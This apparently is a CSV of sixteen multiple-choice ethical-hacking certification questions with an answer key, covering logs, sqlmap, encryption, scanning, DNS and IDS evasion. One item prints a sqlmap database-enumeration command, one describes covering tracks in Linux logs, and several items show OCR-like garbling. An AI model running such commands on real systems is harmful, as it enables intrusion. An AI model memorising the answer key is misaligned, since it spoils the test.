index,question,ground_truth
1,"You have successfully logged on a Linux system. You want to now cover your trade Your login attempt may
be logged on several files located in /var/log. Which file does NOT belongs to the list:
A.  user.log
B.  auth.fesg
C.  wtmp
D.  btmp
",A
2,"What is the following command used for?
sqlmap.py-u
,,http://10.10.1.20/?p=1
&forumaction=search"" -dbs
A.  Creating backdoors using SQL injection
B.  A Enumerating the databases in the DBMS for the URL
C.  Retrieving SQL statements being executed on the database
D.  Searching database statements at the IP address given
",B
3,"Sam, a web developer, was instructed to incorporate a hybrid encryption software program into a web
application to secure email messages. Sam used an encryption software, which is a free implementation of the
OpenPGP standard that uses both symmetric-key cryptography and asymmetric-key cryptography for
improved speed and secure key exchange. What is the encryption software employed by Sam for securing the
email messages?
A.  PGP
B.  S/MIME
C.  SMTP
D.  GPG
",D
4,"Which of the following is assured by the use of a hash?
A.  Authentication
B.  Confidentiality
C.  Availability
D.  Integrity
",D
5,"What is not a PCI compliance recommendation?
A.  Use a firewall between the public network and the payment card data.
B.  Use encryption to protect all transmission of card holder data over any public network.
C.  Rotate employees handling credit card transactions on a yearly basis to different departments.
D.  Limit access to card holder data to as few individuals as possible.
",C
6,"What is the proper response for a NULL scan if the port is closed?
A.  SYN
B.  ACK
C.  FIN
D.  PSH
E.  RST
F.  No response
",E
7,"What kind of detection techniques is being used in antivirus software that identifies malware by collecting data
from multiple protected systems and instead of analyzing files locally it?s made on the provider?s
environment?
A.  Behavioral based
B.  Heuristics based
C.  Honeypot based
D.  Cloud based
",D
8,"Which type of security feature stops vehicles from crashing through the doors of a building?
A.  Bollards
B.  Receptionist
C.  Mantrap
D.  Turnstile
",A
9,"A large mobile telephony and data network operator has a data center that houses network elements. These are
essentially large computers running on Linux. The perimeter of the data center is secured with firewalls and
IPS systems.
What is the best security policy concerning this setup?
A.  Network elements must be hardened with user ids and strong passwords. Regular security tests and audits should be performed.
B.  As long as the physical access to the network elements is restricted, there is no need for additional measures.
C.  There is no need for specific security measures on the network elements as long as firewalls and IPSsystems exist.
D.  The operator knows that attacks and down time are inevitable and should have a backup site.
",A
10,"Which regulation defines security and privacy controls for Federal information systems and organizations?
A.  HIPAA
B.  EU Safe Harbor
C.  PCI-DSS
D.  NIST-800-53
",D
11,"is a set of extensions to DNS that provide the origin authentication of DNS data to DNS clients (resolvers) so
as to reduce the threat of DNS poisoning, spoofing, and similar types of attacks.
A.  DNSSEC
B.  Resource records
C.  Resource transfer
D.  Zone transfer
",A
12,"A hacker is an intelligent individual with excellent computer skills and the ability to explore a computer?s
software and hardware without the owner?s permission. Their intention can either be to simply gain knowledge
or to illegally make changes.
Which of the following class of hacker refers to an individual who works both offensively and defensively at
various times?
A.  White Hat
B.  Suicide Hacker
C.  Gray Hat
D.  Black Hat
",C
13,"Session splicing is an IDS evasion technique in which an attacker delivers data in multiple, small sized packets
to the target computer, making it very difficult for an IDS to detect the attack signatures. Which tool can be
used to perform session splicing attacks?
A.  tcpsplice
B.  Burp
C.  Hydra
D.  Whisker
",D
14,"An incident investigator asks to receive a copy of the event logs from all firewalls, proxy servers, and
Intrusion Detection Systems (IDS) on the network of an organization that has experienced a possible breach of
security. When the investigator attempts to correlate the information in all of the logs, the sequence of many of
the logged events do not match up.
What is the most likely cause?
A.  The network devices are not all synchronized.
B.  Proper chain of custody was not observed while collecting the logs.
C.  The attacker altered or erased events from the logs.
D.  The security breach was a false positive.
",A
15,"A zone file consists of which of the following Resource Records (RRs)?
A.  DNS, NS, AXFR, and MX records
B.  DNS, NS, PTR, and MX records
C.  SOA, NS, AXFR, and MX records
D.  SOA, NS, A, and MX records
",D
16,"If a tester is attempting to ping a target that exists but receives no response or a response that states the
destination is unreachable, ICMP may be disabled and the network may be using TCP. Which other option
could the tester use to get a response from a host using TCP?
A.  Traceroute
B.  Hping
C.  TCP ping
D.  Broadcast ping
",B
